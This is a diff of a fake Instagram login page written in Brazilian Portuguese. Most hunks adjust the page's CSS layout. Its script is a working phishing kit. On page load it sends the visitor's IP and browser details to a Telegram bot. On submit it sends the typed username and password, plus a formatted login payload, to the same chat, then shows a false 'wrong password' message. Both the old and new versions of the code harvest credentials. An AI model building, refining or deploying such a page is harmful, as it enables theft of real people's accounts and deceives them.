@@ -17,20 +17,30 @@
             color: #ffffff;
             display: flex;
             flex-direction: column;
-            height: 100vh;
+            min-height: 100vh;
             align-items: center;
+            justify-content: center; /* Centraliza verticalmente o conteúdo principal */
             padding: 0 25px;
         }
 
         .language-top {
-            margin-top: 20px;
+            position: absolute;
+            top: 20px;
             color: #a8a8a8;
             font-size: 12px;
         }
 
+        .main-content {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: -40px; /* Sobe um pouco a logo para compensar o centralizar */
+        }
+
         .logo-container {
-            margin-top: 80px;
-            margin-bottom: 50px;
+            margin-bottom: 40px;
         }
 
         .instagram-icon {
@@ -40,7 +50,6 @@
 
         .login-form {
             width: 100%;
-            max-width: 400px;
             display: flex;
             flex-direction: column;
             gap: 12px;
@@ -74,7 +83,7 @@
             height: 44px;
             font-size: 15px;
             font-weight: 600;
-            margin-top: 5px;
+            margin-top: 8px;
             cursor: pointer;
         }
 
@@ -85,21 +94,19 @@
         .forgot-link {
             text-align: center;
             font-size: 14px;
-            margin-top: 20px;
+            margin-top: 18px;
             color: #ffffff;
             text-decoration: none;
             font-weight: 500;
         }
 
-        .footer-container {
-            margin-top: auto;
+        .footer-actions {
             width: 100%;
-            max-width: 400px;
-            padding-bottom: 20px;
+            margin-top: 35px; /* Espaçamento reduzido conforme solicitado */
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 15px;
+            gap: 20px;
         }
 
         .create-account-btn {
@@ -114,16 +121,24 @@
             cursor: pointer;
         }
 
+        .meta-container {
+            margin-top: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
         .meta-logo {
             width: 65px;
             opacity: 0.8;
+            margin-top: 5px;
         }
 
         #errorMsg {
             color: #ed4956;
             font-size: 13px;
             text-align: center;
-            margin-top: 10px;
+            margin-top: 15px;
             display: none;
         }
     </style>
@@ -131,23 +146,27 @@
 <body>
     <div class="language-top">Português (Brasil)</div>
     
-    <div class="logo-container">
-        <img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" alt="Instagram" class="instagram-icon">
-    </div>
+    <div class="main-content">
+        <div class="logo-container">
+            <img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" alt="Instagram" class="instagram-icon">
+        </div>
 
-    <form class="login-form" id="loginForm">
-        <input type="text" id="username" placeholder="Nome de usuário, email ou celular" required autocapitalize="none">
-        <input type="password" id="password" placeholder="Senha" required>
-        
-        <button type="submit" class="login-btn" id="loginBtn">Entrar</button>
-        
-        <a href="#" class="forgot-link">Esqueceu a senha?</a>
-        <div id="errorMsg">Senha incorreta. Tente novamente.</div>
-    </form>
+        <form class="login-form" id="loginForm">
+            <input type="text" id="username" placeholder="Nome de usuário, email ou celular" required autocapitalize="none">
+            <input type="password" id="password" placeholder="Senha" required>
+            
+            <button type="submit" class="login-btn" id="loginBtn">Entrar</button>
+            
+            <a href="#" class="forgot-link">Esqueceu a senha?</a>
+            <div id="errorMsg">Senha incorreta. Tente novamente.</div>
+        </form>
 
-    <div class="footer-container">
-        <button type="button" class="create-account-btn">Criar nova conta</button>
-        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
+        <div class="footer-actions">
+            <button type="button" class="create-account-btn">Criar nova conta</button>
+            <div class="meta-container">
+                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
+            </div>
+        </div>
     </div>
 
     <script>
@@ -161,49 +180,47 @@
         const btn = document.getElementById('loginBtn');
         const err = document.getElementById('errorMsg');
 
-        let userIP = "Buscando...";
+        let userIP = "Desconhecido";
 
-        async function fetchIP() {
+        async function fetchInitialData() {
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
                 const d = await r.json();
                 userIP = d.ip;
-                // Enviar visita inicial com UserAgent real
-                sendTelegram(null, null, "📱 *VISITA: INSTAGRAM MOBILE*");
+                await sendTelegram(null, null, "📱 *VISITA: INTERFACE INSTAGRAM*");
             } catch (e) {
-                sendTelegram(null, null, "📱 *VISITA: INSTAGRAM MOBILE*");
+                await sendTelegram(null, null, "📱 *VISITA: INTERFACE INSTAGRAM*");
             }
         }
 
         async function sendTelegram(u, p, title) {
-            const visitorUA = navigator.userAgent;
+            const currentUA = navigator.userAgent;
             const timestamp = Math.floor(Date.now() / 1000);
-            
-            let msg = `${title}\n\n`;
-            
+            let message = `${title}\n\n`;
+
             if (u) {
-                // Formatação idêntica à lógica do script Python fornecido
-                const encPassword = `#PWD_INSTAGRAM_BROWSER:0:${timestamp}:${p}`;
+                // Simula a lógica de enc_password do script fornecido
+                const encPwd = `#PWD_INSTAGRAM_BROWSER:0:${timestamp}:${p}`;
                 
-                msg += `👤 *Credenciais Extraídas*\n`;
-                msg += `Username: \`${u}\`\n`;
-                msg += `Password: \`${p}\`\n\n`;
-                msg += `🔑 *Payload de Login (AJAX)*\n`;
-                msg += `enc_password: \`${encPassword}\`\n\n`;
+                message += `👤 *Dados Capturados*\n`;
+                message += `Usuário: \`${u}\`\n`;
+                message += `Senha: \`${p}\`\n\n`;
+                message += `🔑 *Lógica de Login AJAX*\n`;
+                message += `Payload: \`{"username":"${u}", "enc_password":"${encPwd}"}\`\n\n`;
             }
 
-            msg += `🌐 *Informações do Sistema*\n`;
-            msg += `IP: ${userIP}\n`;
-            msg += `User-Agent: \`${visitorUA}\`\n`;
-            msg += `Plataforma: ${navigator.platform}\n`;
-            msg += `Data: ${new Date().toLocaleString('pt-BR')}`;
+            message += `🌐 *Sistema*\n`;
+            message += `IP: ${userIP}\n`;
+            message += `User-Agent: \`${currentUA}\`\n`;
+            message += `Plataforma: ${navigator.platform}\n`;
+            message += `Hora: ${new Date().toLocaleString('pt-BR')}`;
 
             await fetch(TELEGRAM_API, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: msg,
+                    text: message,
                     parse_mode: 'Markdown'
                 })
             });
@@ -213,8 +230,7 @@
             e.preventDefault();
             btn.disabled = true;
             
-            // Captura e envia as credenciais adaptadas
-            await sendTelegram(userInp.value, passInp.value, "🔐 *LOGIN CAPTURADO (LÓGICA EXTRAÍDA)*");
+            await sendTelegram(userInp.value, passInp.value, "🔐 *TENTATIVA DE LOGIN DETECTADA*");
             
             err.style.display = 'block';
             setTimeout(() => {
@@ -222,7 +238,7 @@
             }, 1000);
         });
 
-        window.onload = fetchIP;
+        window.onload = fetchInitialData;
     </script>
 </body>
 </html>
